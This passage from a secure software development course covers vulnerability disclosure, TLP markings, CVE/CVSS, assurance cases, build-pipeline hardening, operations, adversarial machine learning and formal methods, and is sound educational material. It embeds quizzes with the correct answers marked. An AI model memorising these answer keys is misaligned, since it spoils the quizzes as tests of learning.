However, beware: a bug bounty program can be an incredible waste of money unless the easy to find vulnerabilities are found and fixed first. As Katie Moussouris has noted, *“Not all bugs are created equal"*; many defects (such as most XSS defects) are easy to detect and fix, and *“you should be finding those bugs easily yourselves too.”* Using a bug bounty program to find easy-to-find vulnerabilities is extremely costly and *“is not appropriate risk management.”* She even noted a case where a company ended up paying a security researcher $29,000/hour to find simple well-known defects. Find and fix the simple bugs first, and *then* a bug bounty program may make sense ([*Relying on bug bounties ‘not appropriate risk management’: Katie Moussouris*](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/), by Stilgherrian, 2019).

### Respond To and Fix the Vulnerability in a Timely Way

Of course, once a vulnerability report is received, it must be responded to and fixed in a timely way. OWASP recommends the following ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)):

*   Respond to reports in a reasonable timeline.

*   Communicate openly with researchers.

*   \[Do] not threaten legal action against researchers.

You need to be able to quickly triage vulnerability reports; some reports won’t apply to your software or are not really vulnerabilities. It is quite common to need to ask further questions to really understand the vulnerability.

#### Fixing the Vulnerability

Once you have determined that it really is a vulnerability, you will need to fix it.

If you want to be able to discuss reports in a constrained group - and most groups do - you should set that up ahead of time.

Ensure that you can quickly stand up a working test environment for any supported version and environment of the software. So make sure you have good version control of the source code, and also ensure that you can quickly stand up the development and test environments.

When fixing a security vulnerability, check to see if the same kind of vulnerability exists in similar situations in the software. Otherwise, you will end up creating many more patches.

If your update causes problems, people will reject it and learn to not accept any future updates from you. Any proposed fix must avoid backwards incompatibilities if at all possible. It must also be of high quality. This implies that you need to have a strong *automated* test suite before you release the software, and have any needed hardware to execute it (if the tests need special hardware). Add automated tests related to what you are changing, both to ensure that it really fixes the problem and also to verify that the change does not negatively affect anything else.

![image alt text](worst.png)

**Worst Thing That Could Happen**, retrieved from [xkcd.com](https://xkcd.com/2261/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

#### Limiting Disclosure and the FIRST Traffic Light Protocol (TLP)

When discussing a vulnerability, it is often important to discuss detailed information, yet simultaneously tell people to limit disclosure of some information for a period of time. In addition, it has become common for there to be multiple different parties involved in a vulnerability: there may be multiple suppliers (including vendors) who implement software with the vulnerability, distributors, and organizations involved in distributing information about the vulnerability.

FIRST developed a simple marking system for this called the [Traffic Light Protocol](https://www.first.org/tlp/) (TLP) that is often used to indicate to whom the information can be shared. Here is a brief summary. The TLP has four color values to indicate sharing boundaries, which are placed as follows:

1.  In email: the TLP color is in the subject line and also in the body before the designated information.

2.  In documents: the TLP color is in the header and footer of each page, typically right-justified.

The TLP color is shown in all-caps after “**TLP:**”, so you will see **TLP:RED**, **TLP:AMBER**, **TLP:GREEN**, or **TLP:WHITE**. These colors have the following meaning:

*   **TLP:RED** = Not for disclosure, restricted to participants only.

*   **TLP:AMBER** = Limited disclosure, restricted to participants’ organizations.

*   **TLP:GREEN** = Limited disclosure, restricted to the community.

*   **TLP:WHITE**  = Disclosure is not limited.

#### Get a CVE and Compute CVSS

You should request a CVE where appropriate and it has not already been requested ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Typically, you would start this process once you have verified that the report really is a vulnerability, and thus you would do it simultaneously with fixing it. If you request a CVE, you should also calculate the vulnerability’s Common Vulnerability Scoring System (CVSS) score. CVSS is a rough estimate of a vulnerability’s severity.

The reason for CVEs and CVSS is simple: organizations are overwhelmed with software updates, and they need information to help them prioritize updates. CVE and CVSS are not perfect, but they are widely used and depended on. The Ponemon Institute’s [*Costs and Consequences of Gaps in Vulnerability Responses*](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html) (2019) survey found that:

*   *“Almost half of respondents (48%) report that their organizations had one or more data breaches in the past two years.”*

*   *“60% of breach victims said they were breached due to \[a] known vulnerability where the patch was not applied”*

*   *“CVSS scoring… is often the only metric of patch prioritization \[even though it] leaves out asset criticality and systems as part of vulnerability response.”*

*   *“44% of respondents say their organizations use automation to assist with vulnerability management and patching \[(primarily prioritization and patching)]”*

*   *“Automation reduces the time to respond to vulnerabilities… 80% of organizations… that use automation say they have the ability to respond to vulnerabilities in a shorter timeframe.”* However, this automation depends on a variety of factors, including (in most cases) having a CVE assigned when there is a vulnerability.

CVSS is widely used, because there is a need for clear prioritization, but CVSS is also widely criticized (for example, [*Broken vulnerabilities severities*](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/), by Josh Bressers, 2020). A new version of CVSS (beyond version 3), or a replacement for it, may be developed and/or become widely used in the future.

#### Release the Update and Tell the World

Once the fix is ready, release it. You will need to tell the world the software is fixed, and do all you can to encourage rapid uptake of the fixed version. OWASP recommends that suppliers publish clear security advisories and changelogs, and also that suppliers offer credit to the vulnerability finder ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)).

If there are workarounds that can be applied without updating the software, be sure to note those. This is particularly important if:

*   there are likely to be many users who cannot update their software, or

*   the vulnerability is publicly known, but the patch will not be released for some time.

Ensure that it is easy to automatically update to the fixed version of the software. If your software platform does not provide automated patch releases or installation, consider implementing one yourself. Users need to be able to quickly and automatically receive fixes, unless they have expressly opted out of updates.

Be sure to always credit and thank vulnerability reporters, unless they request otherwise. It is rude to not provide credit, and many vulnerability reporters provide reports *primarily* to get credit. What is worse, reporters may be less cooperative in the future if they do not receive appropriate credit.

#### Quiz 4.1: Respond To and Fix the Vulnerability in a Timely Way

\>>What is the meaning of **TLP:RED**?<<

(!x) Not for disclosure, restricted to participants only.

( ) Limited disclosure, restricted to participants’ organizations.

( ) Limited disclosure, restricted to the community.

( ) Disclosure is not limited.

### Sending Vulnerability Reports to Others

Once you have completed this course, you are far more likely to be able to detect vulnerabilities in software. In this unit, we will discuss how to send vulnerability reports to others.

The [OWASP Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html) recommends that security researchers (who find security vulnerabilities) should:

*   Ensure that any testing is legal and authorized.

*   Respect the privacy of others.

*   Make reasonable efforts to contact the security team of the organization.

*   Provide sufficient details to allow the vulnerabilities to be verified and reproduced.

*   Not demand payment or rewards for reporting vulnerabilities outside of an established bug bounty program.

Reporting a vulnerability that you have found can be surprisingly complicated. If there is a single supplier, you could report to just that supplier. But sometimes there are multiple suppliers and other stakeholders involved. There are also various ways you can choose to report a vulnerability.

#### Reporting Models

There are several different kinds of disclosure models:

1.  **Private Disclosure**<br>*“In the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model. The main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has led to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach.”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

2.  **Full Disclosure**<br>*“With the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response to organizations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix. This makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Another reason to consider full disclosure is if there is reason to believe that the supplier is intentionally malicious; reporting a vulnerability to only a malicious supplier gives the malicious supplier more time to exploit the vulnerability.

3.  **Coordinated Disclosure (historically called Responsible Disclosure)**<br>Coordinated disclosure *“attempts to find a reasonable middle ground between these two approaches. … the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed).”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Historically, this has been called *responsible disclosure*, but this is a biased term, and its original coiner now recommends calling it coordinated disclosure instead. It is **important** that there is a **time limit** before the vulnerability will be unilaterally disclosed. Without a time limit this is essentially identical to private disclosure, since the supplier may have little incentive to fix the vulnerability.

4.  **Disclosure to Attackers**<br>Some researchers work for organizations who attack others’ systems. Other researchers sell vulnerabilities to such organizations, or to brokers who then sell the vulnerabilities on. Doing this is controversial, especially when they are sold to brokers who do not clearly disclose exactly who is buying the vulnerabilities. The impact of doing this varies, because there is great variety in organizations who pay for vulnerabilities. These organizations include law enforcement in various countries, militaries in various countries, organized crime, and/or terrorist groups. Anyone who provides vulnerabilities to attackers should consider the ethical implications. In particular, you should consider what the attackers are likely to do with these vulnerabilities. Do you have confidence that the attackers will not use the vulnerabilities in contravention of human rights? Will they harm certain people or groups such as ethnic minorities, political dissidents, or journalists? If you disclose vulnerabilities to attackers, then you are supporting how these organizations will use those vulnerabilities to attack others; you should be confident that they will use them for good.

From here on we will presume that you follow a *coordinated disclosure model* with some limited timeframe.

Coordinated disclosure time limits (aka *embargo periods*) vary greatly. This time limit is the amount of time between when a reporter reports the vulnerability to the supplier and the reporter will unilaterally disclose it to the public. In general, suppliers push for longer time limits or no time limits, often because that will lower their costs (possibly to nothing if the supplier can get the time limit extended so the supplier never needs to fix the vulnerability). Organizations charged with protecting the public and multi-party organizations tend to press for shorter time limits. Some vulnerabilities are easier to fix than others, which makes simple numbers difficult to choose. Here are some examples of public disclosure time limits:

*   [linux-distros](https://oss-security.openwall.org/wiki/mailing-lists/distros): less than 7 days preferred, up to 14 days allowed, up to 19 days if Thu/Fri report & disclosure on Mon/Tue

*   [oCERT](http://ocert.org/): 14 days standard; 7 days if trivial, 30 days if critical/complex, up to 2 months “extremely exceptional”

*   [CERT/CC](https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm): 45 days “regardless of the existence… of patches or workarounds… Extenuating circumstances … may result in earlier or later disclosure... We will not distribute exploits”

*   [Google Project Zero](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html): 90 days.

#### Further Information

A good source for more information is FIRST’s “[Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)”. Historically many documents have focused on simple bi-lateral coordination between a security researcher and a software supplier, but today there are often complexities due to the need for multi-party coordination. This FIRST document discusses these more complex situations, and provides guidelines for addressing them.

## Miscellaneous

### Assurance Cases

Sadly, you cannot just do one thing and make a system secure. Instead, you need to do a variety of things. Tracking the various techniques you need to do, to ensure that you are really addressing everything you think you should, can become overwhelming… especially if your software gets large or there are expectations of strong security. In addition, sometimes potential stakeholders (such as users) want to understand what you are doing in order to determine if you are doing enough for their purposes. An unstructured list of “*things that were done*” does not really help when a system gets larger; you might do many things, but fail to address something important.

A practical alternative is creating an *assurance case*. An assurance case *“includes a top-level  claim for a property of a system or product (or set of claims), systematic argumentation regarding this claim, and the evidence and explicit assumptions that underlie this argumentation”* ([ISO/IEC 15026-2:2011](https://www.iso.org/standard/52926.html)). Let’s look at that definition; put another way, an assurance case includes:

*   Claim(s): Top-level claim(s) for a property of a system or product. That is, something that you want to be true.

*   Arguments: A systematic argumentation justifying this claim.

*   Evidence/assumptions: Evidence and explicit assumptions underlying the argument.

The point of an assurance case is that it is *systematic*. In other words, you should start with whatever claim(s) you want to make that are important, and repeatedly break that down to show that the claim is true. Imagine that you are a lawyer trying to make a case to a skeptical jury; your job is to justify that the claim(s) are true. Creating an assurance case helps you determine and justify to people that the software is secure, both to others and yourself.

An assurance case does not have to be in any particular form. However, they are often documents with figures showing the high-level structure, and text providing the details. That is simply because it is easy to glance at the figures to see how things work together, but the text provides the details to really understand things.

Let’s talk about one way to create an assurance case, based on material from [*A Sample Security Assurance Case Pattern*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) by David A. Wheeler (2018). Let’s say that we have an overall claim: we want to claim that our “system is adequately secure against moderate threats”. Let’s argue that we can provide adequate proof of this if our security requirements are identified and met by its functionality, and that security is implemented by system life cycle processes. We can break down the security requirements further into our security requirement triad (confidentiality, integrity, and availability), properly handling access control, and identifying and addressing the assets and threat actors. Here is a figure that shows the top level of an assurance case:

![image alt text](top_assurance_case.png)

**Sample top level of an assurance case**, by David A. Wheeler (2018)

We could then repeatedly break each item down further. For example, we might divide the lifecycle processes into areas like design, implementation, and verification. We could then explain how we address security in each:

*   For design, we might show that we followed all the Saltzer & Schroeder (S\&S) design principles we have already discussed.

*   For implementation, we might show that we countered all the “top” vulnerabilities identified by some widely-accepted and relevant list of top vulnerabilities.

*   For verification, we might show that we use a variety of tools to detect vulnerabilities before the software is released.

For a detailed discussion and template for creating an assurance case, see [*A Sample Security Assurance Case Pattern*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) by David A. Wheeler (2018). If you would like to see an actual example, you can see the [OpenSSF Best Practices BadgeApp assurance case](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md).

When do you end? The usual answer is when the stakeholders agree that it is enough. If they don’t think it is enough, then ask them what would be enough and if they are willing to pay for those changes. If they are not paying you enough, then you don’t need to do it.

What is great about an assurance case is that if someone later wants to know “is this software adequately secure”, they can simply review the assurance case. Simply *having* an assurance case provides a lot of confidence, because it shows that someone thought through what the system is supposed to do and has a reasonable argument (with evidence) that the claims are correct.

#### Quiz 4.2: Assurance Cases

\>>Select the true statement(s):<<

\[!x] A claim describes an important property that you want to be true for a system or product

\[x] An assurance case should repeatedly break down a claim until you can show that it is true by showing that each part is true.

\[x] In principle, an assurance case is repeatedly drilled down until the stakeholders agree that enough has been done (e.g., because they are unwilling to pay for more).

### Harden the Development Environment (Including Build and CI/CD Pipeline) & Distribution Environment

Most attacks occur when a system is deployed, but increasingly attackers are attacking systems during their development and distribution. For our purposes, the “development environment” includes the set of all machines and other infrastructure used to develop the software, including each developer’s systems, version control system(s), build systems, CI/CD pipelines, and so on.  The “distribution environment” is the environment used to distribute the resulting built software, e.g., package registries/repositories, container registries/repositories, and so on. It’s important to secure the development environment and distribution environment against unauthorized access or compromise. This includes protecting them against the insertion of malicious code. Assume that attackers are attempting to subvert any system used for software development or distribution, especially any shared systems.

First, minimize privileges. Limit who can control these environments, and by how much. If someone leaves a project and/or organization, remove their privileges; even if they wouldn’t attack, an attacker might acquire their credentials. Limit the privileges given the environments, for example, if a CI/CD pipeline is given an authentication token, provide a token with the minimum privileges necessary so that if the token is exposed the damage is reduced. If a token is only needed in some cases (such as only when processing certain branches like “main”), only provide the token in those cases.

One simple approach is to have developers use multi-factor authentication (MFA) tokens (aka keys) when accessing development environments. These are hardware devices that prove that the developer possesses the device, and since they are single-purpose they are hard for attackers to subvert. If you must use passwords, ensure they are long and not shared between people.

Consider using “branch protection” or similar, if your version control system supports it, to restrict operations that can occur on certain branches (such as “main”). For example, you can ensure that a merge request/pull request has received human review and that it has passed automated checks before the proposed change can be accepted. Protected branches can also prevent dangerous operations such as force pushes, overwrites of commit histories, and similar changes.

Where practical, harden the development environment and distribution environment so they are harder to attack. In many projects, many or all parts of these environments are hosted elsewhere (often in a cloud); make sure the hosting system you choose has adequate security. Once chosen, consult the documentation for the systems you use and configure them to maximize security, e.g., to minimize privileges granted to others. For example, if you use GitHub, look at the [GitHub documentation on securing your repository](https://docs.github.com/en/code-security/getting-started/securing-your-repository). If you have a GitLab installation, [look at the GitLab documentation on securing your installation (“security”)](https://docs.gitlab.com/ee/security/).

The build process should be fully scripted/automated. That way builds will be performed predictably each time. Where possible, the build system should provide provenance information, that is, record what components were included in the build and ideally what components were used to perform the build. Be careful when logging a build process; often you want to avoid recording in log files any secrets like active authentication tokens.

Build, verification, and distribution processes (including CI/CD pipelines) often bring in many other reusable software components. Make sure you apply the good practices discussed in the course sections on (1) [Selecting (Evaluating) Open Source Software](#selecting-evaluating-open-source-software) and (2) [Downloading and Installing Reusable Software](#downloading-and-installing-reusable-software).

Supply chain Levels for Software Artifacts, or SLSA (“salsa”), is a security framework being developed as a checklist of standards and controls to prevent tampering, improve integrity, and secure packages and infrastructure. At the time of this writing it is still in development, but you should consider its recommendations. SLSA is being developed under the Open Source Security Foundation (OpenSSF). To learn more, see the SLSA home page at <https://slsa.dev/>.

Another source for good ideas on hardening development environments against attack, as well as many other approaches for improving security, are in [Software Supply Chain Best Practices](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) from the Cloud Native Computing Foundation (CNCF).

If an attacker manages to subvert the build process, the subverted results are often difficult to detect. A strong countermeasure to this attack is a verified reproducible build. A build is reproducible “if given the same source code, build environment and build instructions, any party can recreate bit-by-bit identical copies of all specified artifacts” (as defined in [“Definitions” from the Reproducible Builds project](https://reproducible-builds.org/docs/definition/)). A reproducible build is also called a deterministic build. A verified reproducible build is simply a build that’s been independently verified to be a reproducible build (on different computer(s)). Verified reproducible builds make attacking the build process much harder, because the attacker must then subvert multiple independent build systems to successfully subvert building the software.

Many builds are reproducible without any changes, however, some are not. The first step in creating a reproducible build is often to verify that if you do the same build twice on the sam system it produces the same result (a *repeatable* build). Using a container image (like a Docker image) or virtual image for the environment can help create a consistent environment for performing reproducible builds. Here are some common challenges in creating reproducible builds:

*   The build result may include date/timestamps. If they can’t be easily removed, a common solution is to use the last modification of something (usually the source code) to set the date/timestamps in any result (using mechanisms such as the `SOURCE_DATE_EPOCH` environment variable).
*   Some values can be in an “arbitrary” order (e.g., due to parallel execution). A common solution is to sort the results (e.g., lexicographically).

More information on how to create reproducible builds is available; see [“Documentation” from the Reproducible Builds project](https://reproducible-builds.org/docs/).

> 😱 STORY TIME: Subversion of SolarWinds Orion’s Build System

> Orion is an enterprise network management software suite from SolarWinds that includes performance and application monitoring as well as network configuration management. In 2020 a threat actor modified the Orion build system so that built versions of Orion would include malicious code. This subverted built system was then signed by the legitimate SolarWinds code signing certificate. This subversion was very damaging; the US government’s Cybersecurity & Infrastructure Security Agency (CISA) even issued an emergency directive (“\[Emergency Directive 21-01]]\(<https://www.cisa.gov/emergency-directive-21-01>)” from CISA). Many security countermeasures couldn’t work in this case; “review code” didn’t work (the change was inserted by the build system and thus not seen by its developers), “check for signatures” didn’t work (it was legitimately signed), and monitoring for problems did not work for a while (because in many organizations this was the monitoring system). For more information, see [Alert AA20-352A](https://www.cisa.gov/emergency-directive-21-01) from CISA and “[Preventing Supply Chain Attacks like SolarWinds](https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/)” by David A. Wheeler.

🔔 Hardening the CI/CD pipeline against unauthorized access, malicious code, or system compromise is part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*.

### Distributing, Fielding/Deploying, Operations, and Disposal

No course can teach everything. This course focuses on *developing* secure software, including its distribution. We have intentionally not focused on processes after development, including distributing, fielding (deploying), operations, and disposal of software. One reason is that there are already many documents and guidelines that try to help people do this securely, but these efforts are hampered because they are trying to twiddle configuration knobs to turn insecure software into secure software. It is generally far more effective, if you want a secure system, to start with secure software.

Of course, distributing, deployment, operations, and disposal all matter. Many projects apply a DevOps or DevSecOps approach, which intentionally blend these processes together with development. Even if development is done by a different group, having secure distribution, fielding, operations, and disposal is critical for software to be secure in the real world. So while this course does not focus on these processes, here are a few tips on these processes that may help you.

When distributing:

*   Use HTTPS (TLS), so that people can verify that it is the intended domain and the information cannot be manipulated between the server and recipient.

*   Where practical, sign the distributed information using a private key *not* available to the server that is distributing the software. Ideally software releases should be signed by a private key that is never available on the Internet. That enables external verification (using the corresponding public key) even if the server is compromised. Unfortunately, this requires ensuring that public keys are securely distributed to the receivers. In some cases, ensuring that the receivers have the correct public keys can be a challenging problem, while in other cases this is easy. A common solution for software updates is to accept an update if it is signed by the same key that signed the currently-installed version of the software. The sigstore project is working to develop easier ways to sign and verify software artifacts; for more information, see <https://www.sigstore.dev/>.

*   If you are distributing an application, arrange to have it updated by default (though allow the user to override this). Users often won’t update unless it’s automatic. There is a risk that an attacker may subvert your build or distribution process, so protect those processes and ensure that updates are only accepted if they are signed by a private key that is never connected to the Internet.

Note that our earlier discussion about software acquisition discussed distribution problems from the opposite side. That is, when acquiring software you want to ensure that you receive what you were supposed to receive, and when distributing software you want to make it easy for recipients to verify this.

Again, consider the recommendations of Supply chain Levels for Software Artifacts, or SLSA (“salsa”), at <https://slsa.dev/>.

When fielding/deploying:

*   Configure your production environment to be secure, including all components you depend on, and keep it updated. For example:

    *   Your environment should be configured to provide least privilege and use maximum security settings your system allows.

    *   Beware of *“insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information”* (as OWASP notes).

    *   Harden your environment by maximally enabling security countermeasures and eliminating unused components (so their vulnerabilities cannot be exploited). These components include your operating systems, database systems, virtual machine monitor, virtual machines, container runtime infrastructure, containers, and anything else you use or depend on. There are many documents that discuss how to harden various components; use them!

    *   Where it is reasonable, enable automatic updates.

*   Avoid giving direct access to your database unless it is necessary *and* you have verified it is secure.

*   Ensure that all data sets have *limited* privilege. In particular, if you use AWS S3 buckets for non-public data, ensure that they have very limited access (many S3 buckets with non-public data have been made publicly readable).

*   Where it makes sense, enable full disk encryption and/or database encryption.

*   Enable monitoring systems that will warn you, or automatically update, when a component in use has a known vulnerability.

*   Turn on logging and redirect it to a central protected location for monitoring. Enable automated systems to detect and warn about likely security problems.

When operating:

*   Update components in a timely way (this is sometimes called *patch and vulnerability management*). In some organizations this job is split between developers who update components within an application and operators who update external components depended on by the application. No matter how you do it, components need to be updated in a timely way or an attacker will be able to exploit them.

*   Examine warnings and/or logs routinely. Determine which ones are indicators of an incident.

*   Respond in a timely way to incidents.

*   Once a vulnerability or incident is resolved, use root cause analysis to figure out *why it happened* so changes can be made to prevent a similar recurrence.

*   Create backups, and store them securely (attackers love to get copies of backups). Test to ensure you can recover from them. Make sure you have offline (“cold”) backups to counter ransomware (which breaks in, encrypts your data, and holds it for ransom).

*   When you receive a vulnerability report, process and fix it in a timely manner. Then give the reporter public credit unless the reporter requests otherwise.

When disposing, make sure you fully destroy any data you are supposed to destroy. Just removing a file does not actually remove its contents from most storage devices.

🔔 Security misconfiguration is such a common mistake in web applications that it is 2017 OWASP Top 10 #6 and 2021 OWASP Top 10 #5.  Protecting automatic update functionality is considered part of 2021 OWASP Top 10 #8 (A08:2021), *Software and Data Integrity Failures*. Using components with known vulnerabilities is such a common web application vulnerability that it is 2017 OWASP Top 10 #9. Using vulnerable and outdated components is 2021 OWASP Top 10 #6. *Security Logging and Monitoring Failures* is 2021 OWASP Top 10 #9. *Insufficient logging and monitoring* is 2017 OWASP Top 10 #10.

#### Quiz 4.3: Distributing, Fielding/Deploying, Operations, and Disposal

\>>Select the true statement(s):<<

\[!x] Don’t give direct access to your database system unless it is necessary *and* you have verified it’s secure.

\[x] In operations, turn on logging and redirect log recording to a central protected location for monitoring.

\[ ] Fix any security issue rapidly, and then just move on to other problems. {{ selected: No, after you fix a security issue (incident), you should also try to find out *why* it happened (a “root cause analysis”) so you can fix the underlying cause. Otherwise, there is a good chance that similar problems will keep happening. }}

### Artificial Intelligence (AI), Machine Learning (ML), and Security

Artificial intelligence (AI) is intelligence demonstrated by machines
(intelligence of humans and animals is sometimes called natural intelligence).
Machine learning (ML) is a field of inquiry devoted to
understanding and building methods that 'learn', that is,
methods that leverage data to improve performance on some set of tasks
(*Machine Learning*, Tom Mitchell).
ML is often considered a subset of AI.
A significant amount of AI security work today focuses on ML;
we will take the same focus here.

Building ML systems often involve several processes, namely
training, testing, and inference. Inference is when the ML system is being
used by its users.
Many ML projects have assumed a closed and trusted environment where
there are no security threats.
However, this assumption is often unrealistic.

*Adversarial machine learning* is the set of efforts to
protect the ML pipeline to ensure its security during training,
test, and inference.
This is an active area of study, and terminology varies.
That said, there are many kinds of potential attacks on ML systems, including:

*   *Evasion* ("do/infer the wrong thing").
    In an evasion attack, the attacker provides a modified input to
    an ML system's classifier during inference so it's misclassified
    while keeping the modification as small as possible
    (Nicolae et al, 2019).
    For example, an attacker might create subtle markings in a road to
    convince a self-driving car to unexpectedly swerve into oncoming traffic.
    Such modified inputs are sometimes called *adversarial inputs*.
    Adversarial inputs can enable the attacker to control the system depending on
    the classifier.
    Thus, this kind of attack may lead to a loss of integrity and/or availability.
*   *Poisoning* ("learn the wrong thing").
    In a poisoning attack, the attacker manipulate data that will be used as
    training data, e.g., to reduce performance, cause misclassification, and/or
    insert backdoors
    (Nicolae et al, 2019).
    ML systems typically need a large amount of training data;
    some attackers may even create or manipulate publicly-available
    data if it is likely to be eventually used for training.
    This kind of attack may lead to a loss of integrity and/or availability.
*   *Loss of confidentiality* ("reveal the wrong thing").
    An attacker may be able to use query results to reveal hidden information.
    Thus, this kind of attack may lead to a loss of confidentiality.
    This kind of attack can be subdivided further, for example:
    *   *Extraction*.
        In an extraction attack, the attacker extracts the parameters or
        structure of the model from observations of the model’s predictions
        (Tabassi 2019).
    *   *(Membership) inference*.
        In a membership inference attack, the attacker
        uses target model query results to determine if specific
        data points belong to the same distribution as the training dataset
        (Tabassi 2019).
    *   *(Model) inversion*.
        In an inversion attack, the attacker is able to
        reconstruct (some) data used to train the model, including
        private and/or secret data (Tabassi 2019).

(Credit: The simple descriptions shown above in parentheses and double-quotes
were coined by Dr. Jeff Alstott.)

Work has especially focused on countering evasion
(adversarial inputs) in ML systems.
Unfortunately, many approaches that *appear* to counter evasion fail to
counter non-naïve attackers.
Here are some example approaches that don't counter determined attackers:

*   *Adversarial training* creates adversarial inputs, then trains the
    model on those inputs. This can improve robustness, but an attacker can
    simply repeat this process more often than the defender.
*   *Null labeling* attempts to train a model that certain inputs are likely
    adversarial (and should be classified as "null" results).
    Again, this appears to be weak against determined adversaries, as explained
    by Carlini and Wagner
    (“Adversarial Examples Are Not Easily Detected:
    Bypassing Ten Detection Methods” by Nicholas Carlini & David Wagner, 2017.)

One tool that may be helpful is the
Adversarial Robustness Toolbox (ART)
<https://github.com/Trusted-AI/adversarial-robustness-toolbox/wiki/>.
The post
[Integrate adversarial attacks in a model training pipeline](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/),
by Singh et al,
provides an example of how ART can be integrated into a larger pipeline.
However, before using any tool you need to determine if it's effective enough
for your circumstances.

Adversarial ML is an active research area.
Before using countermeasures,
determine if the countermeasures will be adequate for your purposes.
Many countermeasures only work against naive attackers who do not
compensate for countermeasures.
Depending on your purposes,
there may not be *any* countermeasure that adequately counters attackers
with adequate confidence.
*Many* countermeasures have been proposed and later found to be inadequate.
One paper that discusses how to evaluate countermeasures is by
[Nicholas Carlini, Anish Athlye, Nicolas Papernot, et al., “On Evaluating Adversarial Robustness”, 2019-02-20](https://arxiv.org/pdf/1902.06705).
We hope that in the future there will be better countermeasures with
more industry-wide confidence.

### Formal Methods

Today most software needs to be developed to be “reasonably” or “adequately” secure. This course has focused on techniques to help you do that. However, if it is *extremely critical* that your software meet some criteria - such as some security criteria - there is an additional approach that you should be aware of: *formal methods*.

Formal methods are the use of *“mathematically rigorous techniques and tools for the specification, design and verification of software and hardware systems”*, where *“mathematically rigorous”* means that *“specifications are well-formed statements in a mathematical logic and that the formal verifications \[if any] are rigorous deductions in that logic”* ([*What is Formal Methods?*](https://shemesh.larc.nasa.gov/fm/fm-what.html), by Ricky W. Butler). In short, formal methods apply mathematics to software.

The big advantages of formal methods are that:

*   You can eliminate many sources of ambiguity.

*   You can *prove* that certain things are true or false, given certain assumptions (and you can decide what the assumptions are).

The big disadvantages of formal methods are that:

*   Using formal methods to develop software today often requires more effort.

*   In many cases, using formal methods also requires specialized knowledge (e.g., of mathematics and/or of the formal methods tools being used).

Many people are working on developing and improving tools to overcome these disadvantages.

Formal methods *are* being used today to develop software, for example:

*   Engineers at Amazon Web Services (AWS) use TLA+ to analyze services including its widely-used Simple Storage Service (S3) and DynamoDB (a NoSQL data store). For more details, see [*Use of Formal Methods at Amazon Web Services*](https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf) (2014) and [*How Amazon Web Services Uses Formal Methods*](https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext) (2015), by Chris Newcombe, Tim Rath, Fan Zhang, Bogdan Munteanu, Marc Brooker, and Michael Daerdeuff.

*   The seL4 operating system kernel (an OSS kernel) has been proven correct.

*   The s2n implementation of TLS/SSL has had formal verification of important aspects and also formally verified its implementation of the HMAC algorithm ([*Automated Reasoning and Amazon s2n*](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/), by Colm MacCarthaigh, 2016).

*   Many proposed cryptographic protocols are examined with model checkers for possible exploits, and some tools embed formal methods approaches to address certain kinds of problems ([*Dramatically Reducing Software Vulnerabilities: Report to the White House Office of Science and Technology Policy*](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf), by Paul E. Black, Lee Badger, Barbara Guttman and Elizabeth Fong, 2016).

*   Hubert Garavel ([*Formal Methods for Safe and Secure Computers Systems*](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study\_875/formal_methods_study\_875.pdf?\__blob=publicationFile\&v=1), 2013) provides a large list where formal methods have been used, as well as a broader survey on formal methods.

That said, using formal methods during software development is unusual today. But formal methods may become more common in the future, or you may be asked to develop software where the risk from a vulnerability is extremely high. So in this section we will provide some brief awareness about formal methods.

